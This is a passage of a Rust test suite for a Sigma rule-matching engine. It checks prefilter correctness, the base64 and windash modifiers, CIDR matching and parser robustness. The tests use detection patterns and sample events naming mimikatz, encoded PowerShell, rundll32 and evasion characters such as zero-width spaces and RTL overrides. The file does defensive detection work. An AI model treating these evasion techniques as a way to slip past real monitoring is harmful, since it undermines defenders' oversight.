    condition: sel_windash or sel_contains
"#;
            let engine = make_engine_with_rule(yaml);

            // Event uses slash variant — only windash can match, AC pattern "-enc" won't hit
            let mut event = HashMap::new();
            event.insert(
                "command_line".to_string(),
                "powershell.exe /enc SQBFAFgA".to_string(),
            );
            let matches = engine.evaluate_event(&event);
            assert_eq!(
                matches.len(),
                1,
                "Rule must match /enc via windash when AC pattern -enc is absent"
            );
        }

        /// `|base64` is a transform modifier — the AC automaton holds the plain-text
        /// value, but the event field contains the base64-encoded form. The rule
        /// must not be pre-filter-skipped when only the plain-text AC pattern is absent.
        #[test]
        fn ac_prefilter_not_skipped_base64_or_contains() {
            let yaml = r#"
title: Base64 OR Contains Pre-filter Test
level: high
logsource: {}
detection:
    sel_b64:
        CommandLine|base64|contains: 'evil'
    sel_contains:
        CommandLine|contains: 'mimikatz'
    condition: sel_b64 or sel_contains
"#;
            let engine = make_engine_with_rule(yaml);

            // base64("evil") = "ZXZpbA=="
            let mut event = HashMap::new();
            event.insert(
                "command_line".to_string(),
                "powershell -enc ZXZpbA==".to_string(),
            );
            let matches = engine.evaluate_event(&event);
            assert_eq!(
                matches.len(),
                1,
                "Rule must match base64(evil) even though plain 'evil' not in AC"
            );
        }

        /// Verify the optimization STILL WORKS for fully AC-covered rules.
        /// A pure |contains rule with a pattern that's absent → correctly no match.
        #[test]
        fn ac_prefilter_correctly_skips_fully_covered_rule() {
            let yaml = r#"
title: Fully AC-Covered Rule
level: medium
logsource: {}
detection:
    selection:
        CommandLine|contains: 'mimikatz'
    condition: selection
"#;
            let engine = make_engine_with_rule(yaml);

            // No "mimikatz" in event → fully_ac_covered pre-filter should skip rule
            let mut event = HashMap::new();
            event.insert(
                "command_line".to_string(),
                "powershell -enc ABC".to_string(),
            );
            assert!(
                engine.evaluate_event(&event).is_empty(),
                "Fully AC-covered rule should be correctly skipped (no false positives)"
            );

            // With "mimikatz" → should match
            let mut event2 = HashMap::new();
            event2.insert("command_line".to_string(), "mimikatz.exe".to_string());
            assert_eq!(engine.evaluate_event(&event2).len(), 1);
        }

        /// Two rules sharing an identical AC literal must BOTH receive the
        /// hit. Before pattern deduplication, duplicate patterns produced
        /// distinct pattern ids, and the AC scan only ever reported one of
        /// them — the later rule's hit bit stayed false and the rule was
        /// prefilter-skipped (false negative found by the head-to-head
        /// correctness cross-check, 2026-07).
        #[test]
        fn ac_prefilter_duplicate_literal_across_rules() {
            let rule_a = r"
title: Rule A
level: medium
logsource: {}
detection:
    selection:
        CommandLine|contains|all:
            - 'shell32.dll'
            - 'Control_RunDLL'
        CommandLine|contains: '\AppData\'
    condition: selection
";
            let rule_b = r"
title: Rule B
level: medium
logsource: {}
detection:
    selection:
        CommandLine|contains|all:
            - 'shell32.dll'
            - 'Control_RunDLL'
    condition: selection
";
            let mut engine = SigmaEngine::new();
            engine.load_rule(rule_a).unwrap();
            engine.load_rule(rule_b).unwrap();

            let mut event = HashMap::new();
            event.insert(
                "command_line".to_string(),
                "rundll32.exe Shell32.dll,Control_RunDLL desk.cpl".to_string(),
            );
            let matches = engine.evaluate_event(&event);
            assert_eq!(
                matches.len(),
                1,
                "Rule B must match even though Rule A registered the same literals first"
            );
            assert_eq!(matches[0].rule_title, "Rule B");
        }

        /// The AC scan must report overlapping matches. `find_iter` reports
        /// non-overlapping matches only: after `shell32.dll` matches, a
        /// pattern like `.dll,` overlapping that span is skipped, its hit
        /// bit stays false, and any fully-AC-covered rule that needs it is
        /// silently dropped (false negative found by the head-to-head
        /// correctness cross-check, 2026-07).
        #[test]
        fn ac_prefilter_overlapping_patterns_all_reported() {
            // Rule A registers `shell32.dll` (matches at 13..24).
            let rule_a = r"
title: Overlap A
level: medium
logsource: {}
detection:
    selection:
        CommandLine|contains: 'shell32.dll'
    condition: selection
";
            // Rule B registers `.dll,` which overlaps A's span (20..25).
            let rule_b = r"
title: Overlap B
level: medium
logsource: {}
detection:
    selection:
        CommandLine|contains: '.dll,'
    condition: selection
";
            let mut engine = SigmaEngine::new();
            engine.load_rule(rule_a).unwrap();
            engine.load_rule(rule_b).unwrap();

            let mut event = HashMap::new();
            event.insert(
                "command_line".to_string(),
                "rundll32.exe Shell32.dll,Control_RunDLL desk.cpl".to_string(),
            );
            let matches = engine.evaluate_event(&event);
            assert_eq!(
                matches.len(),
                2,
                "both rules must match: overlapping AC occurrences must all be reported"
            );
        }

        /// Nested-prefix patterns: `pattern_5` is a prefix of `pattern_500`.
        /// Standard AC semantics report the earliest-ending occurrence
        /// (`pattern_5`) and resume after it — the longer patterns sharing
        /// the same start must still receive their hit bits.
        #[test]
        fn ac_prefilter_nested_prefix_patterns_all_hit() {
            let mut engine = SigmaEngine::new();
            for i in [5, 50, 500] {
                let rule = format!(
                    r"
title: Rule {i}
level: medium
logsource: {{}}
detection:
    selection:
        CommandLine|contains: 'pattern_{i}'
    condition: selection
"
                );
                engine.load_rule(&rule).unwrap();
            }
            let mut event = HashMap::new();
            event.insert(
                "command_line".to_string(),
                "cmd.exe /c pattern_500 something".to_string(),
            );
            // pattern_5, pattern_50, pattern_500 are ALL substrings.
            assert_eq!(
                engine.evaluate_event(&event).len(),
                3,
                "nested prefix patterns must all match"
            );
        }

        /// `not selection` is true exactly when `selection` is false. A no-hit
        /// AC scan must therefore fall through to full condition evaluation
        /// instead of skipping the rule.
        #[test]
        fn ac_prefilter_not_skipped_for_negated_identifier() {
            let yaml = r#"
title: Negated AC Identifier Pre-filter Test
level: medium
logsource: {}
detection:
    selection:
        CommandLine|contains: 'mimikatz'
    condition: not selection
"#;
            let engine = make_engine_with_rule(yaml);

            let mut event = HashMap::new();
            event.insert(
                "command_line".to_string(),
                "powershell -enc ABC".to_string(),
            );
            assert_eq!(
                engine.evaluate_event(&event).len(),
                1,
                "Rule must match when the negated AC identifier is absent"
            );

            let mut event2 = HashMap::new();
            event2.insert("command_line".to_string(), "mimikatz.exe".to_string());
            assert!(
                engine.evaluate_event(&event2).is_empty(),
                "Rule must not match when the negated identifier is present"
            );
        }

        /// A mixed expression can also be satisfied solely by a negated
        /// AC-eligible identifier. The prefilter must account for condition
        /// polarity, not only identifier eligibility.
        #[test]
        fn ac_prefilter_not_skipped_when_negated_branch_can_fire() {
            let yaml = r#"
title: Negated OR Branch Pre-filter Test
level: medium
logsource: {}
detection:
    selection:
        CommandLine|contains: 'whoami'
    filter:
        Image|endswith: '\cmd.exe'
    condition: selection or not filter
"#;
            let engine = make_engine_with_rule(yaml);

            let mut event = HashMap::new();
            event.insert("command_line".to_string(), "powershell -nop".to_string());
            event.insert(
                "image".to_string(),
                "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe".to_string(),
            );
            assert_eq!(
                engine.evaluate_event(&event).len(),
                1,
                "Rule must match through `not filter` when no AC pattern is present"
            );

            let mut event2 = HashMap::new();
            event2.insert("command_line".to_string(), "powershell -nop".to_string());
            event2.insert(
                "image".to_string(),
                "C:\\Windows\\System32\\cmd.exe".to_string(),
            );
            assert!(
                engine.evaluate_event(&event2).is_empty(),
                "Rule must not match when only the negated branch is false"
            );
        }
    }

    // ═════════════════════════════════════════════════════════════════════
    // TRANSFORM MODIFIER TESTS (base64, base64offset, wide)
    // ═════════════════════════════════════════════════════════════════════

    mod transform_modifier_tests {
        use super::*;

        fn make_event(k: &str, v: &str) -> HashMap<String, String> {
            [(k.to_string(), v.to_string())].into_iter().collect()
        }

        fn make_condition(field: &str, values: &[&str], mods: &[ValueModifier]) -> FieldCondition {
            FieldCondition {
                field: field.to_string(),
                field_folded: field.to_lowercase(),
                values: values
                    .iter()
                    .map(|v| SigmaValue::String(v.to_string()))
                    .collect(),
                values_folded: values.iter().map(|v| Some(v.to_lowercase())).collect(),
                values_match_cache: Vec::new(),
                modifiers: mods.to_vec(),
            }
        }

        /// |wide encodes the search string as UTF-16LE ("cmd" → "c\x00m\x00d\x00")
        /// and then performs a contains check. Simulates searching process memory.
        #[test]
        fn wide_modifier_utf16le_match() {
            // "cmd" in UTF-16LE = c\x00m\x00d\x00
            let wide_cmd = "c\x00m\x00d\x00";
            let event = make_event("field", wide_cmd);
            let cond = make_condition(
                "field",
                &["cmd"],
                &[ValueModifier::Wide, ValueModifier::Contains],
            );
            assert!(
                match_field_condition(&cond, &event),
                "|wide should match UTF-16LE encoded string"
            );
        }

        #[test]
        fn wide_modifier_no_match_plain_ascii() {
            // Plain ASCII "cmd" should NOT match via |wide (wrong encoding)
            let event = make_event("field", "cmd");
            let cond = make_condition(
                "field",
                &["cmd"],
                &[ValueModifier::Wide, ValueModifier::Contains],
            );
            // The wide variant "c\x00m\x00d\x00" is not a substring of "cmd"
            assert!(
                !match_field_condition(&cond, &event),
                "|wide should not match plain ASCII string"
            );
        }

        /// |base64 base64-encodes the search value before matching.
        /// "evil" → base64 → "ZXZpbA==" which should then be found in the field.
        #[test]
        fn base64_modifier_encodes_value() {
            // base64("evil") = "ZXZpbA=="
            let event = make_event("cmd", "powershell -enc ZXZpbA==");
            let cond = make_condition(
                "cmd",
                &["evil"],
                &[ValueModifier::Base64, ValueModifier::Contains],
            );
            assert!(
                match_field_condition(&cond, &event),
                "|base64 should match base64-encoded value in field"
            );
        }

        #[test]
        fn base64_modifier_no_match_plain_text() {
            let event = make_event("cmd", "powershell -c evil");
            let cond = make_condition(
                "cmd",
                &["evil"],
                &[ValueModifier::Base64, ValueModifier::Contains],
            );
            // The base64 variant "ZXZpbA==" is not in "powershell -c evil"
            assert!(
                !match_field_condition(&cond, &event),
                "|base64 should not match plain text 'evil' — only the encoded form"
            );
        }

        /// |base64offset generates 3 variants to catch the encoded string at
        /// any 3-byte alignment boundary in a longer base64 stream.
        #[test]
        fn base64offset_catches_offset1_variant() {
            // For offset=1, " -enc " base64-encodes to "IC1lbmMg" (chars 2+)
            // We compute: base64(" " + "-enc ") = "IC1lbmMg", skip 2 → "1lbmMg"
            // Actual test: verify that |base64offset finds -enc at boundary 1
            // We'll compute expected manually via the same algorithm.
            // base64("-enc ") at offset 0 = "LWVuYyA="
            // So the event contains the offset-0 base64 form
            let event = make_event("cmd", "execute LWVuYyA= something");
            let cond = make_condition(
                "cmd",
                &["-enc "],
                &[ValueModifier::Base64Offset, ValueModifier::Contains],
            );
            assert!(
                match_field_condition(&cond, &event),
                "|base64offset offset-0 variant should match"
            );
        }

        #[test]
        fn windash_slash_and_dash_variants() {
            // |windash on "-enc" produces both "-enc" and "/enc" variants
            let event_dash = make_event("cmd", "powershell -enc SQBFAFg=");
            let event_slash = make_event("cmd", "powershell /enc SQBFAFg=");
            let event_none = make_event("cmd", "powershell something");

            let cond = FieldCondition {
                field: "cmd".to_string(),
                field_folded: "cmd".to_string(),
                values: vec![SigmaValue::String("-enc".to_string())],
                values_folded: vec![Some("-enc".to_string())],
                values_match_cache: Vec::new(),
                modifiers: vec![ValueModifier::Windash, ValueModifier::Contains],
            };

            assert!(
                match_field_condition(&cond, &event_dash),
                "windash should match dash variant"
            );
            assert!(
                match_field_condition(&cond, &event_slash),
                "windash should match slash variant"
            );
            assert!(
                !match_field_condition(&cond, &event_none),
                "windash should not match when neither variant present"
            );
        }

        /// Sigma spec windash variant set: `-`, `/`, en dash (U+2013),
        /// em dash (U+2014), horizontal bar (U+2015). Copy-pasted commands
        /// from documents often carry typographic dashes.
        #[test]
        fn windash_unicode_dash_variants() {
            let cond = FieldCondition {
                field: "cmd".to_string(),
                field_folded: "cmd".to_string(),
                values: vec![SigmaValue::String("-enc".to_string())],
                values_folded: vec![Some("-enc".to_string())],
                values_match_cache: Vec::new(),
                modifiers: vec![ValueModifier::Windash, ValueModifier::Contains],
            };

            for (label, dash) in [
                ("en dash", '\u{2013}'),
                ("em dash", '\u{2014}'),
                ("horizontal bar", '\u{2015}'),
            ] {
                let event = make_event("cmd", &format!("powershell {dash}enc SQBFAFg="));
                assert!(
                    match_field_condition(&cond, &event),
                    "windash should match the {label} variant"
                );
            }
        }

        /// A rule written with a typographic dash must also catch the plain
        /// `-` and `/` forms (variant expansion is bidirectional).
        #[test]
        fn windash_unicode_pattern_matches_ascii_event() {
            let cond = FieldCondition {
                field: "cmd".to_string(),
                field_folded: "cmd".to_string(),
                values: vec![SigmaValue::String("\u{2013}enc".to_string())],
                values_folded: vec![Some("\u{2013}enc".to_lowercase())],
                values_match_cache: Vec::new(),
                modifiers: vec![ValueModifier::Windash, ValueModifier::Contains],
            };
            let event_dash = make_event("cmd", "powershell -enc SQBFAFg=");
            let event_slash = make_event("cmd", "powershell /enc SQBFAFg=");
            assert!(match_field_condition(&cond, &event_dash));
            assert!(match_field_condition(&cond, &event_slash));
        }

        /// |base64offset must trim trailing characters whose bits depend on
        /// the bytes FOLLOWING the value: "evil" (4 bytes) encodes to
        /// "ZXZpbA==" in isolation, but embedded mid-stream the stable prefix
        /// is only "ZXZpb". The old behavior kept the `=` padding and missed
        /// any occurrence that wasn't at the very end of the data.
        #[test]
        fn base64offset_matches_value_embedded_mid_stream() {
            // base64("evil more data") = "ZXZpbCBtb3JlIGRhdGE=" — "evil" is at
            // offset 0 but the stream continues, so no "==" appears after it.
            let event = make_event("cmd", "powershell -enc ZXZpbCBtb3JlIGRhdGE=");
            let cond = make_condition(
                "cmd",
                &["evil"],
                &[ValueModifier::Base64Offset, ValueModifier::Contains],
            );
            assert!(
                match_field_condition(&cond, &event),
                "|base64offset must find a value embedded mid-stream (trailing trim)"
            );
        }

        /// All three byte offsets must be detected inside a longer stream.
        #[test]
        fn base64offset_matches_all_three_offsets() {
            let needle = "evil";
            for offset in 0..3usize {
                // Simulate the value appearing at byte offset 0/1/2 in a stream.
                let stream = format!("{}{}{}", "x".repeat(offset), needle, " trailing data");
                let encoded = simple_b64(stream.as_bytes());
                let event = make_event("cmd", &format!("cmd /c {encoded}"));
                let cond = make_condition(
                    "cmd",
                    &[needle],
                    &[ValueModifier::Base64Offset, ValueModifier::Contains],
                );
                assert!(
                    match_field_condition(&cond, &event),
                    "|base64offset must detect value at byte offset {offset} in {encoded}"
                );
            }
        }

        /// Minimal base64 encoder for test fixtures (kept independent of the
        /// engine's internal encoder on purpose).
        fn simple_b64(bytes: &[u8]) -> String {
            const AB: &[u8; 64] =
                b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
            let mut out = String::new();
            for chunk in bytes.chunks(3) {
                let b = [
                    chunk[0],
                    *chunk.get(1).unwrap_or(&0),
                    *chunk.get(2).unwrap_or(&0),
                ];
                let n = (u32::from(b[0]) << 16) | (u32::from(b[1]) << 8) | u32::from(b[2]);
                out.push(AB[(n >> 18) as usize & 63] as char);
                out.push(AB[(n >> 12) as usize & 63] as char);
                out.push(if chunk.len() > 1 {
                    AB[(n >> 6) as usize & 63] as char
                } else {
                    '='
                });
                out.push(if chunk.len() > 2 {
                    AB[n as usize & 63] as char
                } else {
                    '='
                });
            }
            out
        }
    }

    // ═════════════════════════════════════════════════════════════════════
    // PARSER / CONDITION EDGE CASE TESTS
    // ═════════════════════════════════════════════════════════════════════

    mod parser_edge_tests {
        use super::*;

        /// Auto-generated IDs must be in RFC 4122 UUID format:
        /// xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx
        #[test]
        fn parse_auto_id_uuid_format() {
            let yaml = r#"
title: Auto ID UUID Test
logsource:
    category: test
detection:
    sel:
        field: value
    condition: sel
"#;
            let (rule, _) = parse_rule(yaml).unwrap();
            // Must match UUID v4 pattern
            let uuid_re = regex::Regex::new(
                r"^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$",
            )
            .unwrap();
            assert!(
                uuid_re.is_match(&rule.id),
                "Auto-generated ID '{}' does not match UUID v4 format",
                rule.id
            );

            // Same title → same UUID (deterministic)
            let (rule2, _) = parse_rule(yaml).unwrap();
            assert_eq!(rule.id, rule2.id, "Same title must generate same UUID");

            // Different title → different UUID
            let yaml2 = yaml.replace("Auto ID UUID Test", "Different Title");
            let (rule3, _) = parse_rule(&yaml2).unwrap();
            assert_ne!(
                rule.id, rule3.id,
                "Different titles must produce different UUIDs"
            );
        }

        /// ConditionExpr::Multiple — a condition list fires if ANY condition matches.
        #[test]
        fn engine_multiple_conditions_any_fires() {
            let yaml = r#"
title: Multiple Conditions Test
level: high
logsource: {}
detection:
    sel_a:
        field_a: value_a
    sel_b:
        field_b: value_b
    condition:
        - sel_a
        - sel_b
"#;
            let mut engine = SigmaEngine::new();
            engine.load_rule(yaml).unwrap();

            // Only sel_b matches — second condition fires
            let mut event = HashMap::new();
            event.insert("field_b".to_string(), "value_b".to_string());
            let matches = engine.evaluate_event(&event);
            assert_eq!(
                matches.len(),
                1,
                "ConditionExpr::Multiple should fire when any condition matches"
            );

            // sel_a also matches
            let mut event2 = HashMap::new();
            event2.insert("field_a".to_string(), "value_a".to_string());
            assert_eq!(engine.evaluate_event(&event2).len(), 1);

            // Neither matches
            let mut event3 = HashMap::new();
            event3.insert("other".to_string(), "other".to_string());
            assert!(engine.evaluate_event(&event3).is_empty());
        }

        /// `1 of (sel1, sel2)` explicit list syntax in condition.
        #[test]
        fn condition_1_of_explicit_list() {
            let ids: Vec<SearchIdentifier> = ["sel1", "sel2", "sel3"]
                .iter()
                .map(|n| SearchIdentifier {
                    name: n.to_string(),
                    groups: vec![],
                })
                .collect();

            let node = compile_condition("1 of (sel1, sel2)", &ids).unwrap();

            let mut results = HashMap::new();
            results.insert("sel1".to_string(), false);
            results.insert("sel2".to_string(), true);
            results.insert("sel3".to_string(), false);
            assert!(
                node.evaluate(&results),
                "1 of (sel1, sel2) should fire when sel2 matches"
            );

            results.insert("sel2".to_string(), false);
            assert!(
                !node.evaluate(&results),
                "1 of (sel1, sel2) should not fire when neither matches"
            );

            // sel3 matching should NOT count — it's not in the explicit list
            results.insert("sel3".to_string(), true);
            assert!(
                !node.evaluate(&results),
                "1 of (sel1, sel2) should not count sel3"
            );
        }

        /// Multi-document YAML that starts with a `---` separator on the first line.
        #[test]
        fn parse_multi_document_leading_separator() {
            let yaml = "---\ntitle: Rule A\nlogsource:\n    category: test\ndetection:\n    sel:\n        f: v\n    condition: sel\n---\ntitle: Rule B\nlogsource:\n    category: test\ndetection:\n    sel:\n        f: w\n    condition: sel";
            let results = parse_rules(yaml);
            // Filter only successful parses
            let successes: Vec<_> = results.iter().filter(|r| r.is_ok()).collect();
            assert_eq!(
                successes.len(),
                2,
                "Both rules should parse from a YAML string starting with ---"
            );
        }
    }

    // ═════════════════════════════════════════════════════════════════════
    // CIDR EDGE CASE TESTS
    // ═════════════════════════════════════════════════════════════════════

    mod cidr_edge_tests {
        use super::*;

        fn cidr_cond(cidr: &str) -> FieldCondition {
            FieldCondition {
                field: "ip".to_string(),
                field_folded: "ip".to_string(),
                values: vec![SigmaValue::String(cidr.to_string())],
                values_folded: vec![Some(cidr.to_lowercase())],
                values_match_cache: Vec::new(),
                modifiers: vec![ValueModifier::Cidr],
            }
        }

        fn ip_event(ip: &str) -> HashMap<String, String> {
            [("ip".to_string(), ip.to_string())].into_iter().collect()
        }

        /// /0 matches every IPv4 address (wildcard CIDR)
        #[test]
        fn cidr_ipv4_slash0_matches_all() {
            let cond = cidr_cond("0.0.0.0/0");
            assert!(match_field_condition(&cond, &ip_event("1.2.3.4")));
            assert!(match_field_condition(&cond, &ip_event("192.168.1.1")));
            assert!(match_field_condition(&cond, &ip_event("255.255.255.255")));
        }

        /// /32 is an exact host match
        #[test]
        fn cidr_ipv4_slash32_exact_host() {
            let cond = cidr_cond("10.0.0.5/32");
            assert!(
                match_field_condition(&cond, &ip_event("10.0.0.5")),
                "/32 must match the exact host"
            );
            assert!(
                !match_field_condition(&cond, &ip_event("10.0.0.6")),
                "/32 must not match adjacent host"
            );
        }

        /// /128 is an exact IPv6 host match
        #[test]
        fn cidr_ipv6_slash128_exact_host() {
            let cond = cidr_cond("2001:db8::1/128");
            assert!(
                match_field_condition(&cond, &ip_event("2001:db8::1")),
                "/128 must match the exact IPv6 host"
            );
            assert!(
                !match_field_condition(&cond, &ip_event("2001:db8::2")),
                "/128 must not match adjacent IPv6 host"
            );
        }

        /// IPv4 CIDR against an IPv6 address must return false (no cross-version match)
        #[test]
        fn cidr_mixed_version_no_match() {
            let cond = cidr_cond("192.168.1.0/24");
            assert!(
                !match_field_condition(&cond, &ip_event("::ffff:192.168.1.50")),
                "IPv4 CIDR must not match an IPv6-mapped address"
            );
        }
    }

    // ═════════════════════════════════════════════════════════════════════
    // PARSER EDGE CASE TESTS
    // ═════════════════════════════════════════════════════════════════════

    mod parser_bug_tests {
        use super::*;

        // Pipe aggregation must return a clear unsupported error, not a confusing
        // "identifier '>' not found" message from the condition validator.
        #[test]
        fn parse_pipe_aggregation_returns_clear_unsupported_error() {
            let yaml = r#"
title: Count-based Detection
logsource: {}
detection:
    selection:
        CommandLine|contains: 'evil'
    condition: selection | count() > 5
"#;
            let result = parse_rule(yaml);
            assert!(result.is_err());
            let err = result.unwrap_err().to_string();
            assert!(
                err.contains("not yet supported"),
                "Error should mention unsupported: {err}"
            );
            assert!(
                !err.contains("Identifier '>'"),
                "Should NOT say '>' is undefined: {err}"
            );
        }

        // The condition tokenizer must treat comparison operators (`>`, `<`, `=`)
        // and numeric literals as delimiters, not identifier tokens.
        #[test]
        fn validate_conditions_no_false_identifier_for_comparison_ops() {
            let yaml = r#"
title: Comparison Test
logsource: {}
detection:
    selection:
        field: value
    condition: selection | count() > 5
"#;
            let err = parse_rule(yaml).unwrap_err().to_string();
            assert!(
                !err.contains("Identifier '>'"),
                "Comparison ops must not appear as undefined identifiers: {err}"
            );
            assert!(
                !err.contains("Identifier '5'"),
                "Numbers must not appear as undefined identifiers: {err}"
            );
        }

        // Windows-style CRLF line endings must not break multi-document YAML splitting.
        #[test]
        fn parse_rules_handles_windows_crlf_line_endings() {
            let yaml = "title: Rule A\r\nlogsource: {}\r\ndetection:\r\n    sel:\r\n        f: v\r\n    condition: sel\r\n---\r\ntitle: Rule B\r\nlogsource: {}\r\ndetection:\r\n    sel:\r\n        f: w\r\n    condition: sel";
            let results = parse_rules(yaml);
            let successes: Vec<_> = results.iter().filter(|r| r.is_ok()).collect();
            assert_eq!(
                successes.len(),
                2,
                "CRLF multi-doc YAML should parse both rules"
            );
        }

        // Regression: valid rules without pipes still catch typos
        #[test]
        fn validate_conditions_still_rejects_undefined_identifier_typos() {
            let yaml = r#"
title: Typo Rule
logsource: {}
detection:
    selection:
        field: value
    condition: selectoin
"#;
            let err = parse_rule(yaml).unwrap_err().to_string();
            assert!(
                err.contains("selectoin"),
                "Typo in condition should still be caught: {err}"
            );
        }
    }

    // ═════════════════════════════════════════════════════════════════════
    // PHASE 1 HARDENING — Adversarial edge cases, invariants, robustness
    // ═════════════════════════════════════════════════════════════════════
    // Adversaries probe edge cases, boundary conditions, and malformed
    // inputs. Every untested path is an open door. These tests cover the
    // six threat surfaces that the prior suite left unguarded.
    // ═════════════════════════════════════════════════════════════════════

    mod hardening_tests {
        use super::*;

        // ── Helpers ───────────────────────────────────────────────────────

        /// A minimal valid rule YAML used by multiple tests.
        const MINIMAL_RULE: &str = r#"
title: Hardening Test Rule
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains: 'evil'
    condition: selection
"#;

        /// A rule that requires two fields to both be present (AND logic).
        const TWO_FIELD_RULE: &str = r#"
title: Two Field Rule
logsource: {}
detection:
    proc:
        Image|endswith: 'cmd.exe'
    arg:
        CommandLine|contains: '-enc'
    condition: proc and arg
"#;

        fn make_event(pairs: &[(&str, &str)]) -> HashMap<String, String> {
            pairs
                .iter()
                .map(|(k, v)| (k.to_string(), v.to_string()))
                .collect()
        }

        // ── Group 1: Empty & Zero-State ───────────────────────────────────

        /// A freshly constructed engine with no rules must return an empty
        /// result set for any event — including an empty event — without panicking.
        #[test]
        fn empty_engine_no_panic_empty_event() {
            let engine = SigmaEngine::new();
            let event = HashMap::new();
            let results = engine.evaluate_event(&event);
            assert!(
                results.is_empty(),
                "Zero rules loaded: must produce zero matches, got {:?}",
                results
            );
        }

        #[test]
        fn empty_engine_no_panic_populated_event() {
            let engine = SigmaEngine::new();
            let event = make_event(&[("CommandLine", "evil.exe -enc abc")]);
            let results = engine.evaluate_event(&event);
            assert!(
                results.is_empty(),
                "Zero rules loaded: even a suspicious event must produce zero matches"
            );
        }

        /// When a rule requires `CommandLine` but the event has only `ProcessName`,
        /// it must not fire.
        #[test]
        fn empty_event_against_loaded_rule_no_match() {
            let mut engine = SigmaEngine::new();
            engine.load_rule(MINIMAL_RULE).unwrap();
            let results = engine.evaluate_event(&HashMap::new());
            assert!(
                results.is_empty(),
                "Rule requiring CommandLine must not fire on an empty event"
            );
        }

        /// rule_count() must increment by exactly one per successful load_rule call.
        #[test]
        fn rule_count_tracks_accurately() {
            let mut engine = SigmaEngine::new();
            assert_eq!(engine.rule_count(), 0);
            engine.load_rule(MINIMAL_RULE).unwrap();
            assert_eq!(engine.rule_count(), 1);
            engine.load_rule(TWO_FIELD_RULE).unwrap();
            assert_eq!(engine.rule_count(), 2);
        }

        // ── Group 2: Large & Adversarial Inputs ──────────────────────────

        /// A 10,000-character field value must not cause the AC automaton,
        /// regex engine, or any pattern-matching code to panic or hang.
        #[test]
        fn ten_thousand_char_field_value_no_panic() {
            let mut engine = SigmaEngine::new();
            engine.load_rule(MINIMAL_RULE).unwrap();
            let huge = "a".repeat(10_000);
            let event = make_event(&[("CommandLine", &huge)]);
            // Must complete without panic. A non-matching result is correct here.
            let _ = engine.evaluate_event(&event);
        }

        /// An event containing 1,000 distinct field keys must be handled gracefully.
        /// This stresses the logsource enrichment and field-lookup loops.
        #[test]
        fn thousand_field_event_no_panic() {
            let mut engine = SigmaEngine::new();
            engine.load_rule(MINIMAL_RULE).unwrap();
            let mut event = HashMap::new();
            for i in 0..1_000usize {
                event.insert(format!("field_{i}"), format!("value_{i}"));
            }
            let _ = engine.evaluate_event(&event);
        }

        /// A rule with 100 values in a single identifier group must parse and
        /// evaluate without panic. Tests AC pattern registration at scale.
        #[test]
        fn many_values_in_identifier_no_panic() {
            let values: String = (0..100)
                .map(|i| format!("        - 'pattern_{i:03}'"))
                .collect::<Vec<_>>()
                .join("\n");
            let yaml = format!(
                "title: Many Values\nlogsource: {{}}\ndetection:\n    sel:\n        CommandLine|contains:\n{values}\n    condition: sel\n"
            );
            let mut engine = SigmaEngine::new();
            let result = engine.load_rule(&yaml);
            assert!(result.is_ok(), "100-value rule must parse: {:?}", result);
            let event = make_event(&[("CommandLine", "pattern_042")]);
            let results = engine.evaluate_event(&event);
            assert_eq!(results.len(), 1, "Must match the contained pattern");
        }

        /// Unicode characters in field names must not crash the engine.
        /// Logs from non-ASCII systems can include multibyte field names.
        #[test]
        fn unicode_field_name_no_panic() {
            let yaml = r#"
title: Unicode Field Rule
logsource: {}
detection:
    sel:
        Σ_field|contains: 'value'
    condition: sel
"#;
            let mut engine = SigmaEngine::new();
            // Parse may succeed or fail — either is acceptable.
            // What is never acceptable: a panic.
            let _ = engine.load_rule(yaml);
        }

        /// A zero-width space (U+200B) embedded in a field value must not cause
        /// panics. Attackers use zero-width chars to evade string-matching detections.
        #[test]
        fn zero_width_space_in_field_value_no_panic() {
            let mut engine = SigmaEngine::new();
            engine.load_rule(MINIMAL_RULE).unwrap();
            // U+200B (ZERO WIDTH SPACE) injected mid-token — evasion technique
            let event = make_event(&[("CommandLine", "e\u{200B}vil")]);
            let _ = engine.evaluate_event(&event);
        }

        /// Right-to-left override characters in field values must not cause panics.
        /// RTL override (U+202E) is used in filename spoofing attacks.
        #[test]
        fn rtl_override_char_in_field_value_no_panic() {
            let mut engine = SigmaEngine::new();
            engine.load_rule(MINIMAL_RULE).unwrap();
            // U+202E RIGHT-TO-LEFT OVERRIDE — classic filename/log spoofing vector
            let event = make_event(&[("CommandLine", "evil\u{202E}.exe")]);
            let _ = engine.evaluate_event(&event);
        }

        /// A null byte embedded in a field value must not panic the engine.
        /// Binary log artifacts and C-string truncation can introduce \0.
        #[test]
        fn null_byte_in_field_value_no_panic() {
            let mut engine = SigmaEngine::new();
            engine.load_rule(MINIMAL_RULE).unwrap();
            let event = make_event(&[("CommandLine", "evil\x00.exe")]);
            let _ = engine.evaluate_event(&event);
        }

        // ── Group 3: Parser Robustness ────────────────────────────────────

        /// An empty string must return a parse error, never a panic.
        #[test]
        fn load_rule_empty_string_is_graceful_error() {
            let mut engine = SigmaEngine::new();
            let result = engine.load_rule("");
            assert!(result.is_err(), "Empty YAML must be a parse error, not Ok");
        }

        /// Arbitrary garbage bytes must return a parse error, never a panic.
        #[test]
        fn load_rule_garbage_input_is_graceful_error() {
            let mut engine = SigmaEngine::new();
            // High-bit bytes are invalid in Rust &str, so build from raw bytes via from_utf8_lossy
            let raw: &[u8] = &[
                0x00, 0xff, 0xfe, 0x80, 0x81, b' ', b'n', b'o', b't', b' ', b'y', b'a', b'm', b'l',
                0x01, 0x02, 0x03,
            ];
            let garbage = String::from_utf8_lossy(raw);
            let result = engine.load_rule(&garbage);
            assert!(
                result.is_err(),
                "Garbage input must be a parse error, not Ok"
            );
        }

        /// A multi-document YAML where one document is invalid must load the
        /// valid rules and collect the error, without aborting entirely.
        /// This is the contract for bulk rule ingestion from mixed-quality feeds.
        #[test]
        fn load_rules_partial_success_on_mixed_doc() {
            let yaml = "\
title: Valid Rule A\n\
logsource: {}\n\
detection:\n    sel:\n        field: value\n    condition: sel\n\
---\n\
this is garbage yaml :::: \x00\n\
---\n\
title: Valid Rule B\n\
logsource: {}\n\
detection:\n    sel:\n        other: thing\n    condition: sel";
            let mut engine = SigmaEngine::new();
            let (successes, errors) = engine.load_rules(yaml);
            assert_eq!(
                successes.len(),
